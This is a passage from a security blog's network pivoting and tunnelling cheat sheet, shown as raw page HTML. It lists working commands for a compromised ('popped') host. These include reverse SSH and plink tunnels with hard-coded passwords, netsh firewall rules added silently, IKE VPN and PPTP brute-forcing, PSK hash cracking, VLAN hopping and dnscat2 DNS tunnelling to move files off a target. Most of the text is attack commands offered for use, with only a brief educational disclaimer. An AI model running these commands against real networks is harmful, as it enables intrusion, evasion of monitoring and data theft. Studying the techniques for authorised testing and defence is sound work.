+<ul><li>Proxychains &#8211; Perform Nmap scan within a DMZ from an external computer<ul><li>Create a reverse SSH tunnel from the Popped machine on: 2222 </li></ul></li></ul>
+
+
+
+<pre class="wp-block-code"><code>ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com ssh -f -N -R 2222:&lt;local host>:22 root@&lt;remote host></code></pre>
+
+
+
+<ul><li><ul><li>Create a Dynamic application-level port forward on 8080 thru 2222</li></ul></li></ul>
+
+
+
+<pre class="wp-block-code"><code>ssh -f -N -D &amp;lt;local host>:8080 -p 2222 hax0r@&lt;remote host></code></pre>
+
+
+
+<ul><li><ul><li>Leverage the SSH SOCKS server to perform Nmap scan on the network using proxy chains </li></ul></li></ul>
+
+
+
+<pre class="wp-block-code"><code>proxychains nmap --top-ports=20 -sT -Pn $ip/24</code></pre>
+
+
+
+<ul><li>HTTP Tunneling <code>nc -vvn </code></li></ul>
+
+
+
+<pre class="wp-block-code"><code>$ip 8888</code></pre>
+
+
+
+<ul><li>Traffic Encapsulation &#8211; Bypassing deep packet inspection<ul><li>HTTP tunnel<br>On the server-side:</li></ul></li></ul>
+
+
+
+<pre class="wp-block-code"><code>sudo hts -F &lt;server ip addr>:&lt;port of your app> 80</code></pre>
+
+
+
+<ul><li><ul><li>On the client-side:</li></ul></li></ul>
+
+
+
+<pre class="wp-block-code"><code>sudo htc -P &lt;my proxy.com:proxy port> -F &lt;port of your app> &lt;server ip addr>:80 stunnel</code></pre>
+
+
+
+<p></p>
+
+
+
+<ul><li>Tunnel Remote Desktop (RDP) from a Popped Windows machine to your network<ul><li>Tunnel on port 22</li></ul></li></ul>
+
+
+
+<pre class="wp-block-code"><code>plink -l root -pw pass -R 3389:&lt;localhost>:3389 &lt;remote host></code></pre>
+
+
+
+<ul><li> <ul><li>Port 22 blocked? Try port 80? or 443? </li></ul></li></ul>
+
+
+
+<pre class="wp-block-code"><code>plink -l root -pw 23847sd98sdf987sf98732 -R 3389:&lt;local host>:3389 &lt;remote host> -P80</code></pre>
+
+
+
+<ul><li>Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel (bypass deep packet inspection)<ul><li>Windows machine add required firewall rules without prompting the user</li></ul></li></ul>
+
+
+
+<pre class="wp-block-code"><code>netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes</code></pre>
+
+
+
+<pre class="wp-block-code"><code>netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000</code></pre>
+
+
+
+<pre class="wp-block-code"><code>netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080</code></pre>
+
+
+
+<pre class="wp-block-code"><code>netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079</code></pre>
+
+
+
+<ul><li><ul><li>Start the http tunnel client <ul><li><code>httptunnel_client.exe</code></li></ul></li><li>Create HTTP reverse shell by connecting to localhost port 3000 <ul><li><code>plink -l root -pw 23847sd98sdf987sf98732 -R 3389:&lt;local host&gt;:3389 &lt;remote host&gt; -P 3000</code></li></ul></li></ul></li><li>VLAN Hopping<ul><li>git clone https://github.com/nccgroup/vlan-hopping.git chmod 700 frogger.sh ./frogger.sh</li></ul></li><li>VPN Overtaking<ul><li>Identify VPN servers:<br><code>./udp-protocol-scanner.pl -p ike $ip</code></li><li>Scan a range for VPN servers:<br><code>./udp-protocol-scanner.pl -p ike -f ip.txt</code></li><li>Use IKEForce to enumerate or dictionary attack VPN servers: <code>pip install pyip</code> <code>git clone https://github.com/SpiderLabs/ikeforce.git</code> </li><li>Perform IKE VPN enumeration with IKEForce: <code>./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic</code> </li><li>Bruteforce IKE VPN using IKEForce: <code>./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1</code>&nbsp;</li><li>Use ike-scan to capture the PSK hash: </li></ul></li></ul>
+
+
+
+<pre class="wp-block-code"><code>ike-scan 
+ike-scan TARGET-IP 
+ike-scan -A TARGET-IP 
+ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key 
+ike-scan –M –A –n example\_group -P hash-file.txt TARGET-IP </code></pre>
+
+
+
+<pre id="block-ea4a4818-b782-42e6-853c-a96306a91310" class="wp-block-code"><code>Use psk-crack to crack the PSK hash:
+psk-crack hash-file.txt 
+pskcrack psk-crack -b 5 TARGET-IPkey 
+psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key 
+psk-crack -d /path/to/dictionary-file TARGET-IP-key</code></pre>
+
+
+
+<ul><li>PPTP Overtaking<ul><li>Identifying PPTP, it listens on TCP: 1723<br>NMAP PPTP Fingerprint: <code>nmap –Pn -sV -p 1723 TARGET(S)</code>&nbsp;</li><li>PPTP Dictionary Attack <code>thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst</code></li></ul></li><li>Port Forwarding/Redirection</li><li>PuTTY Link tunnel &#8211; SSH Tunneling<ul><li>Forward remote port to local address: <code>plink.exe -P 22 -l root -pw "1337" -R 445:&lt;local host&gt;:445 &lt;remote host&gt;</code></li></ul></li><li>SSH Pivoting<ul><li>SSH pivoting from one network to another: <code>ssh -D &lt;local host&gt;:1010 -p 22 user@&lt;remote host&gt;</code></li></ul></li><li>DNS Tunneling<ul><li>dnscat2 supports “download” and “upload” commands for getting iles (data and programs) to and from the target machine.</li><li>Attacking Machine Installation: apt-get update apt-get -y install ruby-dev git make g++ gem install bundler git clone https://github.com/iagox86/dnscat2.git cd dnscat2/server bundle install</li><li>Run dnscat2: <code>ruby ./dnscat2.rb dnscat2&gt; New session established: 1422 dnscat2&gt; session -i 1422</code></li></ul></li></ul>
+
+
+
+<p class="has-background" style="background-color:#fab7c8">DISCLAIMER: Everything is gathered from different web-resources. Parts of the above writeup belong to unknown authors.</p>
+                        <div class="clearfix"></div>
+                    </article>
+
+                    <!-- tags -->
+                    <div class="after-post-tags">
+                                                <div class="post-categories aretags">
+                            <a class="tag-link bg-light" href="https://catharsis.net.au/blog/tag/dns-tunnel/">dns tunnel</a> <a class="tag-link bg-light" href="https://catharsis.net.au/blog/tag/network/">network</a> <a class="tag-link bg-light" href="https://catharsis.net.au/blog/tag/network-pivot/">network pivot</a> <a class="tag-link bg-light" href="https://catharsis.net.au/blog/tag/network-tunnel/">network tunnel</a> <a class="tag-link bg-light" href="https://catharsis.net.au/blog/tag/pivoting/">pivoting</a> <a class="tag-link bg-light" href="https://catharsis.net.au/blog/tag/tunneling/">tunneling</a>                         </div>
+                                            </div>
+                    <!-- end tags -->
+
+                    <!-- widget after article -->
+                                        <!-- end widget after article -->
+
+                    <!-- author box -->
+                                        <div class="d-flex mt-5 mb-5 align-items-center">
+                        <div class="col-2">
+                            <a href="https://catharsis.net.au/blog/author/sajal-jain/">
+                                <img alt='' src='https://catharsis.net.au/blog/wp-content/uploads/2019/01/Sajal-copy-80x80.jpg' srcset='https://catharsis.net.au/blog/wp-content/uploads/2019/01/Sajal-copy-160x160.jpg 2x' class='avatar avatar-80 photo rounded-circle imgavt mr-4' height='80' width='80' loading='lazy'/>                            </a>
+                        </div>
+                        <div class="ml-2">
+                            <a class="text-muted" href="https://catharsis.net.au/blog/author/sajal-jain/">
+                                <h5>Written by  <span class="text-capitalize">Sajal Jain</span>
+                                </h5>
+                            </a>
+                            <span class="text-muted d-block mb-2">
+                                Cyber Security Enthusiast | OSCP | CEH | CHFI | CNSS | Masters of IT (Major: IT Security) &amp; Masters of IT Management from the University of Sydney.                            </span>
+                            <span class="text-muted d-block">
+                                <a href="https://catharsis.net.au/blog/author/sajal-jain/" class="btn btn-outline-success btn-sm">Profile</a>
+                            </span>
+                        </div>
+                    </div>
+                                        <!-- end author box -->
+
+                </div>
+                <!-- end main column -->
+
+
+                <!-- share -->
+                <div class=" col-md-2 mb-4  order-md-first">
+                    <div class="sticky-top sticky-sidebar-offset">
+                        <div class="share text-center">
+
+                            <div class="sidebarapplause">
+                                
+                        <div id="pt-claps-applause-948" class="pt-claps-applause">
+                            <a class="claps-button" href="https://catharsis.net.au/blog/network-pivoting-and-tunneling-guide/" data-id="948"></a>
+                            <span id="claps-count-948" class="claps-count">5</span><input type="hidden" id="_wpnonce" name="_wpnonce" value="2e36e1b5e6" /><input type="hidden" name="_wp_http_referer" value="/blog/network-pivoting-and-tunneling-guide/" /></div>                            </div>
+
+                                                        <p class="sharecolour">
+                                Share                            </p>
+                            
+<ul class="shareitnow"><li>
+<a target="_blank" href="https://twitter.com/intent/tweet?text=Network%20Pivoting%20and%20Tunneling%20Guide&amp;url=https%3A%2F%2Fcatharsis.net.au%2Fblog%2Fnetwork-pivoting-and-tunneling-guide%2F">
+<i class="fa fa-twitter"></i>
+</a>
+</li><li>
+<a target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcatharsis.net.au%2Fblog%2Fnetwork-pivoting-and-tunneling-guide%2F">        
+<i class="fa fa-facebook"></i>
+</a>
+</li><li>
+<a target="_blank" href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fcatharsis.net.au%2Fblog%2Fnetwork-pivoting-and-tunneling-guide%2F&amp;media=https://catharsis.net.au/blog/wp-content/uploads/2020/10/3193343549_e869a72e52_w.jpg&amp;description=Network%20Pivoting%20and%20Tunneling%20Guide">
+<i class="fa fa-pinterest"></i>
+</a>
+</li><li>
+<a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fcatharsis.net.au%2Fblog%2Fnetwork-pivoting-and-tunneling-guide%2F&amp;title=Network%20Pivoting%20and%20Tunneling%20Guide">
+<i class="fa fa-linkedin"></i>
+</a>
+</li></ul>                            
+                                                        <div class="sep"></div>
+                            <div class="d-none d-md-block">
+                                <p>
+                                    Reply                                </p>
+                                <ul>
+                                    <li>
+                                        <a class="smoothscroll" href="#comments">0<br />
+                                            <svg class="svgIcon-use" width="29" height="29" viewBox="0 0 29 29">
+                                                <path d="M21.27 20.058c1.89-1.826 2.754-4.17 2.754-6.674C24.024 8.21 19.67 4 14.1 4 8.53 4 4 8.21 4 13.384c0 5.175 4.53 9.385 10.1 9.385 1.007 0 2-.14 2.95-.41.285.25.592.49.918.7 1.306.87 2.716 1.31 4.19 1.31.276-.01.494-.14.6-.36a.625.625 0 0 0-.052-.65c-.61-.84-1.042-1.71-1.282-2.58a5.417 5.417 0 0 1-.154-.75zm-3.85 1.324l-.083-.28-.388.12a9.72 9.72 0 0 1-2.85.424c-4.96 0-8.99-3.706-8.99-8.262 0-4.556 4.03-8.263 8.99-8.263 4.95 0 8.77 3.71 8.77 8.27 0 2.25-.75 4.35-2.5 5.92l-.24.21v.32c0 .07 0 .19.02.37.03.29.1.6.19.92.19.7.49 1.4.89 2.08-.93-.14-1.83-.49-2.67-1.06-.34-.22-.88-.48-1.16-.74z">
+                                                </path>
+                                            </svg>
+                                        </a>
+                                    </li>
+                                </ul>
+                            </div>
+                                                    </div>
+                    </div>
+                </div>
+                <!-- end share -->
+
+
+                <!-- sidebar posts -->
+                                <!-- end sidebar posts -->
+
+
+            </div><!-- end row -->
+
+        </div><!-- end container-fluid -->
+
+    </div><!-- end alignfullincol -->
+
+</div>
+<!-- end post id -->
+
+
+
+
+
+<!-- related posts -->
+<!-- end related posts -->
+
+
+<!-- comments -->
+
+<div class="row justify-content-center">
+<div class="col-md-8">
+<div id="comments" class="comments-area">
+
+		<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/blog/network-pivoting-and-tunneling-guide/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://catharsis.net.au/blog/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><p class="comment-form-comment">            
+		<textarea required id="comment" name="comment" placeholder="Write a response..." cols="45" rows="8" aria-required="true"></textarea>
+</p><div class="row"><p class="comment-form-author col-md-4">
+
+<input id="author" name="author" type="text" placeholder="Name" value="" size="30" aria-required='true' />
+</p>
+<p class="comment-form-email col-md-4">
+
+<input id="email" name="email" type="email" placeholder="E-mail address" value="" size="30" aria-required='true' />
+</p>
+<p class="comment-form-url col-md-4">
+
+<input id="url" name="url" type="url"  placeholder="Website Link" value="" size="30" />
+</p></div>
+<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
+<div class="g-recaptcha-wrap" style="padding:10px 0 10px 0"><div class="g-recaptcha" data-sitekey="6LeIG7sZAAAAAAegEEVQfZlWEczcU8Vwj7L11Op6"></div></div><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='948' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p></form>	</div><!-- #respond -->
+	
+</div><!-- #comments -->
+</div>
+</div><!-- end comments -->
+
+<!-- bottom fixed bar -->
+<div class="alertbar">
+    <div class="container">
+                <div class="d-flex justify-content-center align-items-center">
+
+            <div class="follow-links">
+
+                <b>Follow us</b> on
+                                <a target="_blank" href="https://www.facebook.com/catharsis.net.au" class="followlink text-fbblue"><i class="fa fa-facebook"></i></a>
+                
+                                <a target="_blank" href="https://twitter.com/AuCatharsis" class="followlink text-twblue"><i class="fa fa-twitter"></i></a>
+                
+                
+                
+                                <a target="_blank" href="https://www.linkedin.com/company/catharsis-net-au/" class="followlink text-linkedinblue"><i class="fa fa-linkedin"></i></a>
+                
+            </div>
+
+                                </div>
+    </div>
+</div>
+<!-- end bottom fixed bar -->
+
+</div> <!-- / end container site-content -->
+
+<a href="" class="back-to-top"> 
+    <i class="fa fa-angle-up"></i>
+</a>
+
+<div class="container text-center text-md-left">
+<footer class="footer text-muted d-md-flex justify-content-between align-items-center pt-4 pb-4 border-top" itemscope="itemscope" itemtype="http://schema.org/WPFooter" role="contentinfo"> 
+    <div> Copyright © 2020 · Catharsis · All Rights Reserved </div> 
+    <div class="text-md-right"> Catharsis.net.au | Call: 1300 342 276 | e-mail: info@catharsis.net.au </div>
+</footer>
+</div>
+
+
+
+
+
+<script type='application/ld+json'>
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https://catharsis.net.au/blog/network-pivoting-and-tunneling-guide/"
+        },
+        "headline": "Network Pivoting and Tunneling Guide",
+        "description": "This is for pure educational &amp; informational purpose. Only use these techniques where allowed or you have permission to do so. Power comes with great responsibility. Port Forwarding &#8211; accept traffic on a given IP address and port and redirect it to a different IP address and port SSH Local Port Forwarding: supports bi-directional communication [&hellip;]",
+        "datePublished": "October 22, 2020",
+        "dateModified": "October 22, 2020",
+        "image": {
+            "@type": "ImageObject",
+
+                        "url": "https://catharsis.net.au/blog/wp-content/uploads/2020/10/3193343549_e869a72e52_w.jpg",
+            
+            "height": 150,
+            "width": 150        },
+        "publisher": {
+            "@type": "Organization",
+            "name": "Catharsis | Blog",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://catharsis.net.au/blog/wp-content/uploads/2019/01/cropped-cropped-logo_black-1.png",
+                "height": 60,
+                "width": 60
+            }
+        },
+        "author": {
+            "@type": "Person",
+            "name": "Sajal Jain",
+            "sameAs": [
+                                "https://www.facebook.com/catharsis.net.au",                                 "https://twitter.com/AuCatharsis",                                                                 "https://www.linkedin.com/company/catharsis-net-au/"
+                            ]
+        }
+    }
+</script>
+ 
+
+        <script type="text/javascript">
+            let cust_login = document.getElementById("loginform");
+            if(cust_login !== null) {
+                var recaptcha_script = document.createElement('script');
+                recaptcha_script.setAttribute('src','https://www.google.com/recaptcha/api.js');
+                document.head.appendChild(recaptcha_script);                
+            }
+        </script>
+        <script type='text/javascript' src='https://catharsis.net.au/blog/wp-content/themes/mundana/assets/js/theme.min.js?ver=1.1.7.1602108845' id='mundana-scripts-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/comment-reply.min.js?ver=fcf166dc002c474f6e98e68812577e9b' id='comment-reply-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-content/plugins/wp-claps-applause/js/js.cookie.js?ver=2.1.1' id='jquery-cookie-js'></script>
+<script type='text/javascript' id='wp-claps-applause-js-extra'>
+/* <![CDATA[ */
+var clapsapplause = {"ajax_url":"https:\/\/catharsis.net.au\/blog\/wp-admin\/admin-ajax.php","lovedText":"","loveText":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-content/plugins/wp-claps-applause/js/claps-applause.js?ver=1.0.0' id='wp-claps-applause-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/jquery/ui/position.min.js?ver=1.11.4' id='jquery-ui-position-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/jquery/ui/menu.min.js?ver=1.11.4' id='jquery-ui-menu-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=7.4.4' id='wp-polyfill-js'></script>
+<script type='text/javascript' id='wp-polyfill-js-after'>
+( 'fetch' in window ) || document.write( '<script src="https://catharsis.net.au/blog/wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js?ver=3.0.0"></scr' + 'ipt>' );( document.contains ) || document.write( '<script src="https://catharsis.net.au/blog/wp-includes/js/dist/vendor/wp-polyfill-node-contains.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.DOMRect ) || document.write( '<script src="https://catharsis.net.au/blog/wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.URL && window.URL.prototype && window.URLSearchParams ) || document.write( '<script src="https://catharsis.net.au/blog/wp-includes/js/dist/vendor/wp-polyfill-url.min.js?ver=3.6.4"></scr' + 'ipt>' );( window.FormData && window.FormData.prototype.keys ) || document.write( '<script src="https://catharsis.net.au/blog/wp-includes/js/dist/vendor/wp-polyfill-formdata.min.js?ver=3.0.12"></scr' + 'ipt>' );( Element.prototype.matches && Element.prototype.closest ) || document.write( '<script src="https://catharsis.net.au/blog/wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js?ver=2.0.2"></scr' + 'ipt>' );
+</script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/dist/dom-ready.min.js?ver=db63eb2f693cb5e38b083946b14f0684' id='wp-dom-ready-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/dist/i18n.min.js?ver=bb7c3c45d012206bfcd73d6a31f84d9e' id='wp-i18n-js'></script>
+<script type='text/javascript' id='wp-a11y-js-translations'>
+( function( domain, translations ) {
+	var localeData = translations.locale_data[ domain ] || translations.locale_data.messages;
+	localeData[""].domain = domain;
+	wp.i18n.setLocaleData( localeData, domain );
+} )( "default", { "locale_data": { "messages": { "": {} } } } );
+</script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/dist/a11y.min.js?ver=13971b965470c74a60fa32d392c78f2f' id='wp-a11y-js'></script>
+<script type='text/javascript' id='jquery-ui-autocomplete-js-extra'>
+/* <![CDATA[ */
+var uiAutocompleteL10n = {"noResults":"No results found.","oneResult":"1 result found. Use up and down arrow keys to navigate.","manyResults":"%d results found. Use up and down arrow keys to navigate.","itemSelected":"Item selected."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/jquery/ui/autocomplete.min.js?ver=1.11.4' id='jquery-ui-autocomplete-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/jquery/suggest.min.js?ver=1.1-20110113' id='suggest-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/jquery/ui/slider.min.js?ver=1.11.4' id='jquery-ui-slider-js'></script>
+<script type='text/javascript' id='wpuf-subscriptions-js-extra'>
+/* <![CDATA[ */
+var wpuf_subscription = {"pack_notice":"Please Cancel Your Currently Active Pack first!"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-content/plugins/wp-user-frontend/assets/js/subscriptions.js?ver=fcf166dc002c474f6e98e68812577e9b' id='wpuf-subscriptions-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/wp-embed.min.js?ver=fcf166dc002c474f6e98e68812577e9b' id='wp-embed-js'></script>
+<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?ver=fcf166dc002c474f6e98e68812577e9b' id='google-recaptcha-js'></script>
+
+
+
+</body>     
+</html>
+ 
